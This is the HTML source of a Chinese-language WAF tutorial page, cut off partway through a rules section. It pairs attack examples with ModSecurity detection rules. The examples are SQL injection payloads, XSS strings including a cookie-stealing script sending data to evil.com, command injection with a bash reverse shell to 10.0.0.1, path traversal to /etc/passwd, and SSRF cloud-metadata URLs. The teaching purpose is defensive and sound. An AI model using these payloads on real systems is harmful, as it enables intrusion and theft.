<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What The WAF - WAF 學習平台</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --phosphor: #00ff41;
            --phosphor-dim: #00cc33;
            --phosphor-glow: rgba(0, 255, 65, 0.15);
            --amber: #ffb000;
            --amber-dim: #cc8c00;
            --amber-glow: rgba(255, 176, 0, 0.15);
            --danger: #ff3333;
            --danger-glow: rgba(255, 51, 51, 0.15);
            --cyan: #00d4ff;
            --cyan-dim: #00a8cc;
            --obsidian: #0a0a0a;
            --obsidian-light: #141414;
            --surface: #1a1a1a;
            --surface-elevated: #242424;
            --text-primary: #e8e8e8;
            --text-secondary: #888888;
            --text-dim: #555555;
            --border: #2a2a2a;
            --border-glow: #333333;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Space Grotesk', system-ui, sans-serif;
            background: var(--obsidian);
            color: var(--text-primary);
            line-height: 1.7;
            position: relative;
            overflow-x: hidden;
        }

        /* Atmospheric Background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 65, 0.015) 2px,
                    rgba(0, 255, 65, 0.015) 4px
                ),
                radial-gradient(ellipse at 50% 0%, rgba(0, 255, 65, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* CRT Scanline Effect */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                to bottom,
                transparent 0px,
                transparent 1px,
                rgba(0, 0, 0, 0.15) 1px,
                rgba(0, 0, 0, 0.15) 2px
            );
            pointer-events: none;
            z-index: 9999;
            animation: scanlines 0.1s linear infinite;
        }

        @keyframes scanlines {
            0% { transform: translateY(0); }
            100% { transform: translateY(2px); }
        }

        /* Navigation */
        nav {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(10, 10, 10, 0.92);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border);
            z-index: 1000;
            padding: 0.875rem 2rem;
        }

        nav::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--phosphor-dim), transparent);
            opacity: 0.5;
        }

        nav .container {
            max-width: 1100px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--phosphor);
            letter-spacing: -0.02em;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            text-shadow: 0 0 20px var(--phosphor-glow);
        }

        .logo::before {
            content: '>';
            color: var(--text-dim);
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {
            50% { opacity: 0; }
        }

        .nav-links {
            display: flex;
            gap: 0.25rem;
            list-style: none;
        }

        .nav-links a {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: var(--text-secondary);
            text-decoration: none;
            padding: 0.5rem 0.875rem;
            border-radius: 4px;
            transition: all 0.2s ease;
            position: relative;
        }

        .nav-links a::before {
            content: './';
            color: var(--text-dim);
            opacity: 0;
            transition: opacity 0.2s;
        }

        .nav-links a:hover::before {
            opacity: 1;
        }

        .nav-links a:hover {
            color: var(--phosphor);
            background: var(--phosphor-glow);
        }

        /* Hero Section */
        .hero {
            padding: 10rem 2rem 6rem;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, var(--phosphor-glow) 0%, transparent 70%);
            opacity: 0.4;
            pointer-events: none;
        }

        .hero-ascii {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6rem;
            color: var(--text-dim);
            margin-bottom: 2rem;
            line-height: 1.2;
            letter-spacing: 0.1em;
            opacity: 0.6;
        }

        .hero h1 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 4rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            color: var(--text-primary);
            letter-spacing: -0.03em;
            position: relative;
        }

        .hero h1 .highlight {
            color: var(--phosphor);
            text-shadow: 0 0 30px var(--phosphor-glow), 0 0 60px var(--phosphor-glow);
            position: relative;
        }

        .hero p {
            font-size: 1.125rem;
            color: var(--text-secondary);
            max-width: 560px;
            margin: 0 auto 2.5rem;
            line-height: 1.8;
        }

        /* Container */
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        /* Section */
        section {
            padding: 5rem 0;
            position: relative;
        }

        section h2 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            font-weight: 500;
            margin-bottom: 2.5rem;
            color: var(--phosphor);
            text-transform: uppercase;
            letter-spacing: 0.15em;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        section h2::before {
            content: '//';
            color: var(--text-dim);
        }

        section h2::after {
            content: '';
            flex: 1;
            height: 1px;
            background: linear-gradient(90deg, var(--border), transparent);
        }

        /* Cards */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 1.25rem;
        }

        .card {
            background: var(--surface);
            padding: 1.75rem;
            border: 1px solid var(--border);
            position: relative;
            transition: all 0.3s ease;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background: var(--phosphor);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--phosphor-glow) 0%, transparent 50%);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .card:hover {
            border-color: var(--phosphor-dim);
            transform: translateX(4px);
        }

        .card:hover::before {
            opacity: 1;
        }

        .card:hover::after {
            opacity: 1;
        }

        .card h3 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.875rem;
            display: flex;
            align-items: center;
            gap: 0.625rem;
            position: relative;
            z-index: 1;
        }

        .card h3 .icon {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.6875rem;
            font-weight: 500;
            color: var(--phosphor);
            opacity: 0.7;
            letter-spacing: 0.02em;
        }

        .card p {
            color: var(--text-secondary);
            font-size: 0.9375rem;
            position: relative;
            z-index: 1;
        }

        /* Attack Types */
        .attack-badge {
            font-family: 'JetBrains Mono', monospace;
            display: inline-block;
            padding: 0.25rem 0.625rem;
            font-size: 0.6875rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            margin-bottom: 1rem;
            border: 1px solid;
        }

        .badge-critical {
            background: var(--danger-glow);
            color: var(--danger);
            border-color: var(--danger);
        }

        .badge-high {
            background: var(--amber-glow);
            color: var(--amber);
            border-color: var(--amber);
        }

        .badge-medium {
            background: var(--phosphor-glow);
            color: var(--phosphor);
            border-color: var(--phosphor);
        }

        /* Code Block */
        .code-block {
            background: var(--obsidian);
            padding: 1.25rem;
            margin: 1rem 0;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8125rem;
            border: 1px solid var(--border);
            position: relative;
            line-height: 1.6;
        }

        .code-block::before {
            content: 'terminal';
            position: absolute;
            top: 0;
            right: 0;
            font-size: 0.625rem;
            color: var(--text-dim);
            padding: 0.375rem 0.625rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            border-left: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
        }

        .code-block code {
            color: var(--text-primary);
            white-space: pre;
            display: block;
        }

        .code-comment {
            color: var(--text-dim);
            font-style: italic;
        }

        .code-keyword {
            color: var(--cyan);
        }

        .code-string {
            color: var(--phosphor);
        }

        .code-danger {
            color: var(--danger);
        }

        /* Interactive Quiz */
        .quiz-container {
            background: var(--surface);
            padding: 2rem;
            border: 1px solid var(--border);
        }

        .quiz-question {
            margin-bottom: 1.5rem;
        }

        .quiz-question h4 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            margin-bottom: 1rem;
            color: var(--amber);
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .quiz-input {
            width: 100%;
            padding: 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            margin-bottom: 1rem;
            transition: border-color 0.2s;
        }

        .quiz-input:focus {
            outline: none;
            border-color: var(--phosphor-dim);
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 0.625rem;
        }

        .quiz-option {
            padding: 1rem 1.25rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            cursor: pointer;
            transition: all 0.2s ease;
            color: var(--text-secondary);
            font-size: 0.9375rem;
            position: relative;
            padding-left: 2.5rem;
        }

        .quiz-option::before {
            content: '';
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            width: 8px;
            height: 8px;
            border: 1px solid var(--text-dim);
            background: transparent;
            transition: all 0.2s;
        }

        .quiz-option:hover {
            border-color: var(--phosphor-dim);
            color: var(--text-primary);
        }

        .quiz-option:hover::before {
            border-color: var(--phosphor);
        }

        .quiz-option.correct {
            border-color: var(--phosphor);
            background: var(--phosphor-glow);
            color: var(--phosphor);
        }

        .quiz-option.correct::before {
            background: var(--phosphor);
            border-color: var(--phosphor);
            box-shadow: 0 0 10px var(--phosphor-glow);
        }

        .quiz-option.incorrect {
            border-color: var(--danger);
            background: var(--danger-glow);
            color: var(--danger);
        }

        .quiz-option.incorrect::before {
            background: var(--danger);
            border-color: var(--danger);
        }

        .btn {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.75rem 1.5rem;
            border: none;
            cursor: pointer;
            font-size: 0.8125rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background: var(--phosphor);
            color: var(--obsidian);
            font-weight: 600;
            position: relative;
            overflow: hidden;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.4s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            background: var(--phosphor-dim);
            box-shadow: 0 0 20px var(--phosphor-glow);
        }

        .btn-secondary {
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border);
        }

        .btn-secondary:hover {
            border-color: var(--phosphor-dim);
            color: var(--phosphor);
        }

        .result-box {
            padding: 1rem 1.25rem;
            margin-top: 1rem;
            display: none;
            border: 1px solid;
            font-size: 0.9375rem;
        }

        .result-box.show {
            display: block;
        }

        .result-success {
            background: var(--phosphor-glow);
            border-color: var(--phosphor-dim);
            color: var(--phosphor);
        }

        .result-error {
            background: var(--danger-glow);
            border-color: var(--danger);
            color: var(--danger);
        }

        /* WAF Rule Demo */
        .rule-demo {
            background: var(--surface);
            padding: 2rem;
            margin-top: 1.5rem;
            border: 1px solid var(--border);
            position: relative;
        }

        .rule-demo::before {
            content: 'WAF_SIMULATOR';
            position: absolute;
            top: -0.75rem;
            left: 1rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.625rem;
            color: var(--amber);
            background: var(--surface);
            padding: 0.25rem 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.15em;
            border: 1px solid var(--amber-dim);
        }

        .rule-demo h3 {
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 600;
            margin-bottom: 0.75rem;
            color: var(--text-primary);
        }

        .rule-input-group {
            display: flex;
            gap: 0.75rem;
            margin-bottom: 1rem;
        }

        .rule-input-group input {
            flex: 1;
            padding: 0.875rem 1rem;
            background: var(--obsidian);
            border: 1px solid var(--border);
            color: var(--phosphor);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.875rem;
            transition: all 0.2s;
        }

        .rule-input-group input:focus {
            outline: none;
            border-color: var(--phosphor-dim);
            box-shadow: 0 0 0 3px var(--phosphor-glow);
        }

        .rule-input-group input::placeholder {
            color: var(--text-dim);
        }

        .detection-result {
            padding: 1rem 1.25rem;
            margin-top: 1rem;
            border: 1px solid;
        }

        .detection-blocked {
            background: var(--danger-glow);
            border-color: var(--danger);
            animation: blocked-pulse 0.5s ease;
        }

        @keyframes blocked-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .detection-allowed {
            background: var(--phosphor-glow);
            border-color: var(--phosphor);
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 0.25rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            border-bottom: 1px solid var(--border);
            padding-bottom: 0.75rem;
        }

        .tab {
            font-family: 'JetBrains Mono', monospace;
            padding: 0.625rem 1rem;
            background: transparent;
            border: 1px solid transparent;
            cursor: pointer;
            color: var(--text-dim);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            transition: all 0.2s ease;
            position: relative;
        }

        .tab::after {
            content: '';
            position: absolute;
            bottom: -0.8125rem;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--phosphor);
            transform: scaleX(0);
            transition: transform 0.2s;
        }

        .tab:hover {
            color: var(--text-secondary);
        }

        .tab.active {
            color: var(--phosphor);
            background: var(--phosphor-glow);
            border-color: var(--border);
        }

        .tab.active::after {
            transform: scaleX(1);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: tabFade 0.3s ease;
        }

        @keyframes tabFade {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Accordion */
        .accordion {
            border: 1px solid var(--border);
            overflow: hidden;
            margin-bottom: 0.75rem;
        }

        .accordion-header {
            padding: 1rem 1.25rem;
            background: var(--surface);
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.2s;
        }

        .accordion-header:hover {
            background: var(--surface-elevated);
        }

        .accordion-header h4 {
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 500;
            color: var(--text-primary);
            font-size: 0.9375rem;
        }

        .accordion-icon {
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            transition: transform 0.3s;
        }

        .accordion.active .accordion-icon {
            transform: rotate(180deg);
            color: var(--phosphor);
        }

        .accordion-content {
            padding: 0 1.25rem;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease;
            background: var(--obsidian-light);
        }

        .accordion.active .accordion-content {
            padding: 1.25rem;
            max-height: 2000px;
        }

        /* Progress Bar */
        .progress-container {
            margin-bottom: 2rem;
        }

        .progress-bar {
            height: 4px;
            background: var(--border);
            overflow: hidden;
            position: relative;
        }

        .progress-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                90deg,
                transparent,
                transparent 4px,
                var(--obsidian) 4px,
                var(--obsidian) 8px
            );
            z-index: 2;
        }

        .progress-fill {
            height: 100%;
            background: var(--phosphor);
            transition: width 0.5s ease;
            box-shadow: 0 0 10px var(--phosphor-glow);
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-top: 0.625rem;
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        /* Footer */
        footer {
            background: var(--obsidian);
            padding: 3rem 2rem;
            text-align: center;
            border-top: 1px solid var(--border);
            position: relative;
        }

        footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--phosphor-dim), transparent);
            opacity: 0.3;
        }

        footer p {
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-dim);
            font-size: 0.75rem;
            letter-spacing: 0.05em;
        }

        footer a {
            color: var(--phosphor);
            text-decoration: none;
            transition: color 0.2s;
        }

        footer a:hover {
            color: var(--phosphor-dim);
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .hero h1 {
                font-size: 2.5rem;
            }

            .hero-ascii {
                display: none;
            }

            .rule-input-group {
                flex-direction: column;
            }

            .card-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        @keyframes typewriter {
            from { width: 0; }
            to { width: 100%; }
        }

        .animate-in {
            animation: fadeIn 0.6s ease forwards;
            opacity: 0;
        }

        .glitch-text:hover {
            animation: glitch 0.3s ease;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--obsidian);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--phosphor-dim);
        }

        /* Selection */
        ::selection {
            background: var(--phosphor);
            color: var(--obsidian);
        }

        /* Focus visible */
        :focus-visible {
            outline: 2px solid var(--phosphor);
            outline-offset: 2px;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="container">
            <div class="logo">what_the_waf</div>
            <ul class="nav-links">
                <li><a href="#intro">intro</a></li>
                <li><a href="#attacks">attacks</a></li>
                <li><a href="#rules">rules</a></li>
                <li><a href="#bypass">bypass</a></li>
                <li><a href="#log-analysis">logs</a></li>
                <li><a href="#quiz">quiz</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero">
        <pre class="hero-ascii">
    ╔═══════════════════════════════════════════════════════════╗
    ║  ██╗    ██╗ █████╗ ███████╗    ██████╗ ███████╗███████╗  ║
    ║  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗██╔════╝██╔════╝  ║
    ║  ██║ █╗ ██║███████║█████╗      ██║  ██║█████╗  █████╗    ║
    ║  ██║███╗██║██╔══██║██╔══╝      ██║  ██║██╔══╝  ██╔══╝    ║
    ║  ╚███╔███╔╝██║  ██║██║         ██████╔╝███████╗██║       ║
    ║   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝ ╚══════╝╚═╝       ║
    ╚═══════════════════════════════════════════════════════════╝
        </pre>
        <h1>What The <span class="highlight glitch-text">WAF</span></h1>
        <p>深入了解 Web Application Firewall 的運作原理，學習如何保護您的網站應用程式免受常見攻擊</p>
        <a href="#intro" class="btn btn-primary">$ ./start_learning</a>
    </section>

    <div class="container">
        <!-- Introduction Section -->
        <section id="intro">
            <h2>什麼是 WAF</h2>
            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[DEF]</span> 定義</h3>
                    <p>Web Application Firewall (WAF) 是一種應用層防火牆，專門用於監控、過濾和阻止進出 Web 應用程式的 HTTP/HTTPS 流量。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[OBJ]</span> 目的</h3>
                    <p>WAF 主要目的是保護 Web 應用程式免受常見的攻擊，如 SQL Injection、XSS、CSRF 等 OWASP Top 10 威脅。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[HOW]</span> 運作方式</h3>
                    <p>WAF 透過預定義的規則集或機器學習模型來分析 HTTP 請求，識別並阻止惡意流量。</p>
                </div>
            </div>

            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">WAF 架構示意</h3>
                <div class="code-block">
                    <code>
┌─────────┐     ┌─────────┐     ┌─────────────┐     ┌──────────┐
│  User   │────▶│   WAF   │────▶│ Web Server  │────▶│ Database │
└─────────┘     └─────────┘     └─────────────┘     └──────────┘
                     │
                     ▼
              ┌─────────────┐
              │ Rule Engine │
              │ ─────────── │
              │ • Signatures│
              │ • Regex     │
              │ • ML Model  │
              └─────────────┘
                    </code>
                </div>
            </div>
        </section>

        <!-- Attack Types Section -->
        <section id="attacks">
            <h2>常見攻擊類型</h2>

            <div class="tabs">
                <button class="tab active" data-tab="sqli">SQL Injection</button>
                <button class="tab" data-tab="xss">XSS</button>
                <button class="tab" data-tab="rce">Command Injection</button>
                <button class="tab" data-tab="path">Path Traversal</button>
                <button class="tab" data-tab="ssrf">SSRF</button>
            </div>

            <!-- SQL Injection -->
            <div class="tab-content active" id="sqli">
                <div class="card">
                    <span class="attack-badge badge-critical">CRITICAL</span>
                    <h3><span class="icon">[SQLi]</span> SQL Injection (SQL 注入)</h3>
                    <p>攻擊者透過在輸入欄位中注入惡意 SQL 程式碼，來操控後端資料庫。</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">-- 基本認證繞過</span>
<span class="code-danger">' OR '1'='1</span>
<span class="code-danger">' OR 1=1--</span>
<span class="code-danger">admin'--</span>

<span class="code-comment">-- Union 攻擊</span>
<span class="code-danger">' UNION SELECT username, password FROM users--</span>

<span class="code-comment">-- 時間盲注</span>
<span class="code-danger">' AND SLEEP(5)--</span>
<span class="code-danger">' AND IF(1=1, SLEEP(5), 0)--</span>

<span class="code-comment">-- 堆疊查詢</span>
<span class="code-danger">'; DROP TABLE users;--</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># ModSecurity 規則範例</span>
SecRule ARGS <span class="code-string">"(?i)(union.*select|select.*from|insert.*into|delete.*from|drop\s+table)"</span> \
    <span class="code-keyword">"id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- XSS -->
            <div class="tab-content" id="xss">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[XSS]</span> Cross-Site Scripting (XSS)</h3>
                    <p>攻擊者將惡意腳本注入到網頁中，當其他用戶瀏覽該頁面時執行。</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">// Reflected XSS</span>
<span class="code-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="code-danger">&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="code-comment">// DOM-based XSS</span>
<span class="code-danger">&lt;svg onload=alert('XSS')&gt;</span>
<span class="code-danger">&lt;body onpageshow=alert('XSS')&gt;</span>

<span class="code-comment">// Cookie 竊取</span>
<span class="code-danger">&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>

<span class="code-comment">// 事件處理器</span>
<span class="code-danger">&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 偵測 script 標籤和事件處理器</span>
SecRule ARGS <span class="code-string">"(?i)(&lt;script|javascript:|on\w+\s*=)"</span> \
    <span class="code-keyword">"id:1002,phase:2,deny,status:403,msg:'XSS Attack Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Command Injection -->
            <div class="tab-content" id="rce">
                <div class="card">
                    <span class="attack-badge badge-critical">CRITICAL</span>
                    <h3><span class="icon">[RCE]</span> Command Injection (命令注入)</h3>
                    <p>攻擊者透過注入系統命令，在伺服器上執行任意程式碼。</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 命令串接</span>
<span class="code-danger">; ls -la</span>
<span class="code-danger">| cat /etc/passwd</span>
<span class="code-danger">&& whoami</span>

<span class="code-comment"># 命令替換</span>
<span class="code-danger">`id`</span>
<span class="code-danger">$(whoami)</span>

<span class="code-comment"># 反彈 Shell</span>
<span class="code-danger">; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 偵測常見命令注入模式</span>
SecRule ARGS <span class="code-string">"(?i)(;|\||&&|\$\(|`).*(cat|ls|whoami|id|passwd|shadow)"</span> \
    <span class="code-keyword">"id:1003,phase:2,deny,status:403,msg:'Command Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Path Traversal -->
            <div class="tab-content" id="path">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[LFI]</span> Path Traversal (路徑穿越)</h3>
                    <p>攻擊者透過操作檔案路徑來存取伺服器上未授權的檔案。</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 基本路徑穿越</span>
<span class="code-danger">../../../etc/passwd</span>
<span class="code-danger">....//....//....//etc/passwd</span>

<span class="code-comment"># URL 編碼</span>
<span class="code-danger">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</span>
<span class="code-danger">..%252f..%252f..%252fetc/passwd</span>

<span class="code-comment"># Null Byte</span>
<span class="code-danger">../../../etc/passwd%00.jpg</span>

<span class="code-comment"># Windows 路徑</span>
<span class="code-danger">..\..\..\windows\system32\config\sam</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- SSRF -->
            <div class="tab-content" id="ssrf">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[SSRF]</span> Server-Side Request Forgery (SSRF)</h3>
                    <p>攻擊者誘導伺服器向內部網路或其他服務發送請求。</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 存取內部服務</span>
<span class="code-danger">http://localhost:8080/admin</span>
<span class="code-danger">http://127.0.0.1:3306/</span>

<span class="code-comment"># 存取雲端元資料</span>
<span class="code-danger">http://169.254.169.254/latest/meta-data/</span>
<span class="code-danger">http://metadata.google.internal/</span>

<span class="code-comment"># 繞過技術</span>
<span class="code-danger">http://0.0.0.0:8080/</span>
<span class="code-danger">http://[::]:8080/</span>
<span class="code-danger">http://127.1/</span>
                        </code>
                    </div>
                </div>
            </div>
        </section>

        <!-- WAF Rules Section -->
        <section id="rules">
            <h2>WAF 規則設計</h2>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>正則表達式基礎</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content">
                    <p>WAF 規則大量使用正則表達式來匹配惡意模式：</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 常用 Regex 元字符</span>
.       <span class="code-comment"># 匹配任意字符</span>
*       <span class="code-comment"># 匹配前一個字符 0 次或多次</span>
+       <span class="code-comment"># 匹配前一個字符 1 次或多次</span>
?       <span class="code-comment"># 匹配前一個字符 0 次或 1 次</span>
\s      <span class="code-comment"># 匹配空白字符</span>
\w      <span class="code-comment"># 匹配字母數字字符</span>
(?i)    <span class="code-comment"># 大小寫不敏感</span>
|       <span class="code-comment"># 或運算符</span>

<span class="code-comment"># SQL 注入偵測範例</span>
<span class="code-string">(?i)(union\s+select|select\s+.*\s+from)</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>ModSecurity 規則語法</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content">
                    <p>ModSecurity 是最流行的開源 WAF 引擎：</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 規則基本結構</span>
SecRule <span class="code-keyword">VARIABLE</span> <span class="code-string">"OPERATOR"</span> <span class="code-keyword">"ACTIONS"</span>

<span class="code-comment"># 範例：阻擋 SQL 注入</span>
SecRule ARGS <span class="code-string">"(?i)union.*select"</span> \
    <span class="code-keyword">"id:1001,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'SQL Injection Attack'"</span>

<span class="code-comment"># 常用變數</span>
ARGS            <span class="code-comment"># 所有請求參數</span>
REQUEST_URI     <span class="code-comment"># 請求 URI</span>
REQUEST_BODY    <span class="code-comment"># 請求主體</span>
REQUEST_HEADERS <span class="code-comment"># 請求標頭</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>OWASP CRS (Core Rule Set)</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content">
                    <p>OWASP CRS 是一組通用的 WAF 規則集：</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 規則類別</span>
REQUEST-911-METHOD-ENFORCEMENT    <span class="code-comment"># HTTP 方法限制</span>
REQUEST-913-SCANNER-DETECTION     <span class="code-comment"># 掃描器偵測</span>
REQUEST-920-PROTOCOL-ENFORCEMENT  <span class="code-comment"># 協議規範</span>
